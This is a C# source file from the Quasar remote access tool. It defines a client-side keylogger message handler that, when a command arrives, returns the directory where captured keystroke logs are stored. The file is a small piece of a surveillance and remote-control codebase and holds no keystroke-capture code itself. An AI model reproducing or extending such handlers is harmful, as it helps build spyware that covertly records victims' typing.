using Quasar.Client.Config;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;

namespace Quasar.Client.Messages
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            
        }
    }
}
